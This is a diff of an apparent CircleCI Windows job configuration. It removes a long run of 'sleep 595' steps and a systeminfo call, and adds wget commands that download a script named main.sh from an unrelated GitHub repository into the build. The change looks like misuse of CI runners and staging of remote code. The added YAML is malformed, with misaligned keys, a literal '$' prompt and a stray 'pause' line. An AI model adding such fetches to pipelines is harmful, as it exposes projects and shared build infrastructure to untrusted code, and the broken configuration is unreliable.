@@ -7,35 +7,13 @@ jobs:
   build:
     executor:
       name: win/default
-      shell: powershell.exe
     steps:
-      - checkout
-      - run: systeminfo
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-      - run: sleep 595
-       
+      # default shell is Powershell
+      - run:            
+         command: $ wget https://github.com/tumintuman/boneyard/blob/a43e5636f6097aaf02f8ae26628597e655b5740d/tumbal/main.sh
       - run:
-          name: "Check docker"
-          shell: powershell.exe
-          command: |
-            docker info
-            docker run hello-world:nanoserver-1809
+         command: wget https://github.com/tumintuman/boneyard/blob/a43e5636f6097aaf02f8ae26628597e655b5740d/tumbal/main.sh
+          pause
+      - run:
+         command: echo hello & echo world
+         shell: cmd.exe
